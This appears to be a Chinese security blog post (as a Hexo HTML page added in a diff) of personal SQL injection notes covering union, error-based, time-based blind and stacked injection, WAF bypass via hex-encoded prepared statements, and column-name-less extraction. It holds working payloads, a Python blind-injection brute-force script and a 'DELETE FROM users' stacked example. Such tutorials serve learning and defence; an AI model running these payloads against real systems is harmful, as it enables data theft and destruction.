@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>SQL注入笔记 | AFKL&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="SQL注入笔记这里是我的SQL注入笔记，绝赞更新中！欢迎批评斧正！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入笔记">
+<meta property="og:url" content="http://yoursite.com/2020/02/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="AFKL&#39;s Blog">
+<meta property="og:description" content="SQL注入笔记这里是我的SQL注入笔记，绝赞更新中！欢迎批评斧正！">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.afkl.ml/usr/uploads/2020/02/531845518.png">
+<meta property="article:published_time" content="2020-02-24T12:31:00.000Z">
+<meta property="article:modified_time" content="2020-06-26T15:54:17.373Z">
+<meta property="article:author" content="AFKL">
+<meta property="article:tag" content="Blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.afkl.ml/usr/uploads/2020/02/531845518.png">
+  
+    <link rel="alternate" href="/atom.xml" title="AFKL&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">AFKL&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-SQL注入笔记" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" class="article-date">
+  <time datetime="2020-02-24T12:31:00.000Z" itemprop="datePublished">2020-02-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SQL注入笔记
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入笔记"><a href="#SQL注入笔记" class="headerlink" title="SQL注入笔记"></a>SQL注入笔记</h1><p>这里是我的SQL注入笔记，绝赞更新中！欢迎批评斧正！</p>
+<p>[TOC]</p>
+<h2 id="普通注入-amp-amp-基础命令"><a href="#普通注入-amp-amp-基础命令" class="headerlink" title="普通注入&amp;&amp;基础命令"></a>普通注入&amp;&amp;基础命令</h2><h3 id="常用查库、表指令"><a href="#常用查库、表指令" class="headerlink" title="常用查库、表指令"></a>常用查库、表指令</h3><pre><code>查库： select schema_name from information_schema.schemata &lt;==&gt; show databases
+
+查表：select table_name from information_schema.tables where table_schema=0x7365637572697479(库名)    //&apos;security&apos;
+
+查列：select column_name from information_schema.columns where table_name=&apos;~~~~&apos;;    //column 列；栏
+
+查字段：select (column1),(column2) from (表名).(列名);</code></pre><p>其中schema_name;table_name;column_name…可视为一种全局变量;</p>
+<h3 id="concat-函数、ordor-by"><a href="#concat-函数、ordor-by" class="headerlink" title="concat()函数、ordor by"></a>concat()函数、ordor by</h3><p>有时查列或表一次性无法显示全，就用group_concat()包住上列全局变量;<br>group_concat()的作用是将所有数据拼接为1行显示，详细可查看concat函数介绍;</p>
+<p>order by指令原本用于排序，但在注入中可以用于确定列数；<br>假定某表有3列；</p>
+<pre><code>/?id=1&apos; order by 1;--&gt;成功
+/?id=1&apos; order by 2;--&gt;成功
+/?id=1&apos; order by 3;--&gt;成功
+/?id=1&apos; order by 4;--&gt;失败</code></pre><p>故此表有三列;<br>limit (起始序号(0开始)),(展示行数);<br>待补充…</p>
+<h3 id="不常用全局变量"><a href="#不常用全局变量" class="headerlink" title="不常用全局变量"></a>不常用全局变量</h3><pre><code>select system_user()&lt;==&gt;user()    //展示系统用户
+
+select database()            //展示数据库名
+
+select version()            //展示版本信息
+
+select @@datadir            //展示数据储存路径
+
+select @@version_compile_os    //展示服务器系统</code></pre><h3 id="为什么会有1-2-select…"><a href="#为什么会有1-2-select…" class="headerlink" title="为什么会有1,2,select…"></a>为什么会有1,2,select…</h3><p>类似于（union selcet 1,2,<del>#）的缘故:<br>上例是确定了此表有三列，为想要的数据得到展示，选择第三列来显示;<br>当如（union 1,selcet ~</del>,3#）时数据会出现在第二列;</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="XPath语法错误注入"><a href="#XPath语法错误注入" class="headerlink" title="XPath语法错误注入"></a>XPath语法错误注入</h3><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>extractvalue()：从目标XML中返回包含所查询值的字符串。<br>EXTRACTVALUE (XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>concat:返回结果为连接参数产生的字符串。<br>当我们在XPath_string故意填入错误的XPath时，在回显报错的同时会执行XPath的sql语句。<br>可根据此函数进行报错注入</p>
+<pre><code>// 这里是为了绕过空格的检测，所以用()把所有的东西包裹起来
+// 0x7e是“~”，是sql的一元运算符，可以防止在回显的时候不回显第一组数据
+// 可以的话想用0x5e“^”也可以...
+extractvalue(NULL,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables))))#
+extractvalue(NULL,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata))))#</code></pre><h4 id="UPDATEXML"><a href="#UPDATEXML" class="headerlink" title="UPDATEXML()"></a>UPDATEXML()</h4><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>和上面同理，但需要多加一个NULL</p>
+<h3 id="整型溢出错误注入（SQL-lt-5-5-53）"><a href="#整型溢出错误注入（SQL-lt-5-5-53）" class="headerlink" title="整型溢出错误注入（SQL&lt;5.5.53）"></a>整型溢出错误注入（SQL&lt;5.5.53）</h3><pre><code>select ~0;
+&gt;&gt;&gt; 18446744073709551615</code></pre><p>这里我们对0进行了取反，导致数据溢出</p>
+<pre><code>select !(select * from (select user())x);
+&gt;&gt;&gt; 1</code></pre><p>当一条语句执行成功时，返回0。因此非一下就变成了“1”.</p>
+<pre><code>select exp(710);
+&gt;&gt;&gt; ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;</code></pre><p>这里exp()计算自然指数。到了710就已经溢出了，我们尝试：</p>
+<pre><code>select exp(~(select*from(select user())x));
+&gt;&gt;&gt; DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</code></pre><p>虽然报错，但成功返回用户信息。以此来注入。</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>在时间盲注中共使用了4个比较重要的语句：</p>
+<pre><code>sleep(s);         # 将语句延迟s秒
+if(a,b,c);         # 如果a语句成立，执行b，否则执行c
+ascii(a);        # 将语句a的字符转换为ascii(十进制)
+substr(a,b,c);    # 将a的语句，从b(num)的位置开始，截取c(num)个字符</code></pre><p>我们将其一个一个结合起来就可以得到：</p>
+<pre><code>select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),?,1))=?),sleep(5),1);
+# 一一拆分对应
+select if(@a,sleep(5),1)     #如果@a语句成立，执行sleep(5)，否则返回1
+@a=(ascii(@b)=?)            #判断ascii后的@b是否等于?中的数字
+@b=substr(@c,?,1)            #从?处开始，截取@c语句中的1个字符
+@c=(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database())     #查表语句，可以变换为查列，查字段的语句</code></pre><p>由此，我们可以实现爆破来获得信息<br>这里来一个python脚本(版本&gt;3.0)（十分臃肿</p>
+<pre><code>import requests
+
+mode = input(&quot;plz input use mode:&quot;)
+# T查表 C查列 F查字段
+while(True):
+    if(mode == &apos;T&apos;):
+        payload = &apos;select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(5),1)&apos;
+        break
+
+    elif(mode == &apos;C&apos;):
+        tab = input(&apos;plz input tables_name:&apos;)
+        payload = &apos;select if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x&apos;+tab.encode(&apos;UTF-8&apos;).hex()+&apos;),%s,1)))=%s,sleep(5),1)&apos;
+        break
+
+    elif(mode == &apos;F&apos;):
+        tab = input(&apos;plz input tables_name:&apos;)
+        col = input(&apos;plz input col_name:&apos;)
+        payload = &apos;select if((ascii(substr((select &apos;+ col +&apos; from &apos;+ tab +&apos; limit 0,1),%s,1))=%s),sleep(5),1)&apos;
+        break
+
+    elif(mode != &apos;F&apos;|&apos;C&apos;|&apos;T&apos;):
+        print(&apos;Error&apos;)
+
+url = &apos;http://114514.com/FAQ.php&apos;
+res = &apos;&apos;
+sel_num = input(&quot;plz input sel_num:&quot;)
+# 要查询的字符数
+
+for i in range(1,sel_num):
+    print(i)
+    for j in range(32,127):
+        print(chr(j))
+        now_payload = payload % (i,j)
+        try:
+            r = requests.post(url=url,data=now_payload,timeout=4.5)
+            # 这里视情况更改
+        except:
+            res += chr(j)
+print(res)</code></pre><h2 id="sql堆叠注入"><a href="#sql堆叠注入" class="headerlink" title="sql堆叠注入"></a>sql堆叠注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在一定条件下，我们可以通过 “ ; ” 提前结束sql语句，并在后面跟上其它sql语句，得到执行。在myphpadmin我们便可以这样多句执行<br>比如：</p>
+<pre><code>$a = $_GET[&apos;a&apos;];
+$sql = &quot;SELECT * FROM users WHERE id=$id&quot;;</code></pre><p>在这里我们甚至可以构造：</p>
+<pre><code>$a = &quot;1;DELETE FROM users&quot;;</code></pre><p>将整个users表全部删除！可见其危害有多大<br>不过一般来说，这种注入的局限比较大…<br>可能数据库引擎不支持，权限不足等…都会导致注入失败，还有就是，结果不一定会有回显…<br>yysy,我刚开始我从字面意思以为是什么数据溢出的骚操作（</p>
+<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><h4 id="sql预处理语句"><a href="#sql预处理语句" class="headerlink" title="sql预处理语句"></a>sql预处理语句</h4><p>在可以进行堆叠注入时，且像”select、or…“等重要语句被过滤时，可以使用sql预处理语句</p>
+<pre><code>SET @a=&quot;select * from users&quot;; #怎么说？设定了一个a变量
+PREPARE test FROM @a; #使test=@a
+EXECUTE test; #加载test语句</code></pre><p>这样，我们就可以执行@a所设定的语句<br>再来，我们将我们的@a所设定的语句转换为hex，即可绕过大多数的waf<br>这里，我们尝试：</p>
+<pre><code>http://114514.com/?id=1&apos;;SET+@a=0x73656C65637420736C656570283529;PREPARE+test+FROM+@a;EXECUTE+test;&quot;
+//select sleep(5);</code></pre><h2 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass - information_schema"></a>bypass - information_schema</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>也不是什么奇技淫巧，只是有其它的类似于information_schema的东西可以用来替代。<br>这里先只给出payload，详细原理之后补上。不知其所以然是不行的。</p>
+<pre><code># 无自增id时
+select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();
++---+---+-------------------------------+
+| 1 | 2 | group_concat(table_name)      |
++---+---+-------------------------------+
+| 1 | 2 | users,emails,uagents,referers |
++---+---+-------------------------------+
+
+# 有自增id时
+select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()；
++---+---+-------------------------------+
+| 1 | 2 | group_concat(table_name)      |
++---+---+-------------------------------+
+| 1 | 2 | emails,referers,uagents,users |
++---+---+-------------------------------+</code></pre><p><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a><br>原作者说，可能还有更多方式，但我现在时间有限。之后再说。</p>
+<h2 id="as别名的无列名注入"><a href="#as别名的无列名注入" class="headerlink" title="as别名的无列名注入"></a>as别名的无列名注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>通过as和虚拟表来使数据导入至虚拟表并赋予别名，以此在不知道列名的状况下，通过别名窃取到数据。</p>
+<h3 id="as语句"><a href="#as语句" class="headerlink" title="as语句"></a>as语句</h3><p>要了解此注入先需要知道什么是as。<br>其实也简单，它就是为数据起了一个别名。<br>例如，我使用如下语句查询到了以下结果：</p>
+<pre><code>select * from users;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+</code></pre><p>这时候，可能有人不懂洋文(比如我)，这时候我们可以用as语句进行转换：</p>
+<pre><code>select id as 编号,username as 用户名,password as 密码 from users;
++--------+-----------+------------+
+| 编号    |  用户名    | 密码       |
++--------+-----------+------------+
+|      1 | Dumb      | Dumb       |
+|      2 | Angelina  | I-kill-you |
+|      3 | Dummy     | p@ssword   |
+|      4 | secure    | crappy     |
+|      5 | stupid    | stupidity  |
+|      6 | superman  | genious    |
+|      7 | batman    | mob!le     |
+|      8 | admin     | admin      |
+|      9 | admin1    | admin1     |
+|     10 | admin2    | admin2     |
+|     11 | admin3    | admin3     |
+|     12 | dhakkan   | dumbo      |
+|     14 | admin4    | admin4     |
++--------+-----------+------------+</code></pre><p>可以发现，id、username、password都变成了中文。</p>
+<h3 id="无列名查询"><a href="#无列名查询" class="headerlink" title="无列名查询"></a>无列名查询</h3><p>但需要注意的是，这并不是在原表修改的，而是产生了一张虚拟表。这使得我们可以不用查列名即可获得数据。这就让我们可以干一些奇怪的事情。<br>注意，这里需要知道表的列数(其实也容易获取)</p>
+<pre><code>select 1,2,3 as c;
+# 获得了一张虚拟表，最后列名是c
++---+---+---+
+| 1 | 2 | c |
++---+---+---+
+| 1 | 2 | 3 |
++---+---+---+
+
+select 1,2,3 as c union select * from users;
+# 我们发现原有的列名被替换了
++----+----------+------------+
+| 1  | 2        | c          |
++----+----------+------------+
+|  1 | 2        | 3          |
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+
+
+# 这时候，我们就可以对这个虚拟表干一些奇怪的事情
+select group_concat(c) from (select 1,2,3 as c union select * from users) as b;
+# 这里是又建立了另一个表，让他查询我们之前导入了数据的虚拟表，便可以提出数据
+# 注意，新表一定要起别名，不然会报错(指上面的as b)
+# 这个太长了，我就在下面放图片了</code></pre><p><img src="https://www.afkl.ml/usr/uploads/2020/02/531845518.png" alt="getc.PNG" title="getc.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" data-id="ckbweck8r00068892e69lg18z" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/02/24/FLASK%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-WIP/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          FLASK学习笔记-WIP
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/02/24/%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84Hgame2020-CTF%E7%9A%84WP/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">不完整的Hgame2020-CTF的WP</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/06/17/dozerCTF-Fake-phpminiadmin/">dozerCTF - Fake phpminiadmin</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/24/BJDCTF-3rd-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/">BJDCTF 3rd-小知识点</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/">网鼎杯2020-小知识点</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/21/HFCTF2020-uploadBaby/">HFCTF2020-uploadBaby</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/17/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/">C语言实现学生信息管理系统</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 AFKL<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
